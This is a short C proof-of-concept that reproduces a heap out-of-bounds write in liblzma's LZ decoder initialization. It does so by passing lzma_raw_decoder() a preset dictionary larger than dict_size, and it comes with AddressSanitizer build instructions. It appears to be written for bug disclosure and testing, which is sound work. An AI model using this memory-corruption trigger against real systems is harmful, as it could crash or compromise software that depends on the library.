// PoC: heap out-of-bounds write in the LZ decoder initialization when a
// preset dictionary is used with lzma_raw_decoder().
//
// The lzma_options_lzma API documents that a preset dictionary bigger
// than dict_size is allowed: "If the size is bigger than dict_size,
// only the last dict_size bytes are processed." This program uses only
// the public API with such options.
//
// Build against an AddressSanitizer build of liblzma and run:
//   cc -fsanitize=address -g -I src/liblzma/api pocs/newbug.c \
//       <path-to-build>/liblzma.a -o newbug && ./newbug

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <lzma.h>


int
main(void)
{
	// The preset dictionary doesn't need any specific content.
	static uint8_t preset[8192];
	memset(preset, 0x5A, sizeof(preset));

	lzma_options_lzma options;
	if (lzma_lzma_preset(&options, 0)) {
		fprintf(stderr, "lzma_lzma_preset() failed\n");
		return 1;
	}

	options.dict_size = 4096;
	options.preset_dict = preset;
	options.preset_dict_size = sizeof(preset);

	const lzma_filter filters[2] = {
		{
			.id = LZMA_FILTER_LZMA1,
			.options = &options,
		}, {
			.id = LZMA_VLI_UNKNOWN,
			.options = NULL,
		},
	};

	lzma_stream strm = LZMA_STREAM_INIT;
	const lzma_ret ret = lzma_raw_decoder(&strm, filters);
	printf("lzma_raw_decoder() returned %d\n", (int)ret);
	if (ret != LZMA_OK)
		return 1;

	// The crash happens above during the initialization, but exercise
	// the stream a little anyway.
	uint8_t out[4096];
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	strm.next_in = NULL;
	strm.avail_in = 0;
	const lzma_ret ret2 = lzma_code(&strm, LZMA_RUN);
	printf("lzma_code() returned %d\n", (int)ret2);

	lzma_end(&strm);

	printf("no crash\n");
	return 0;
}
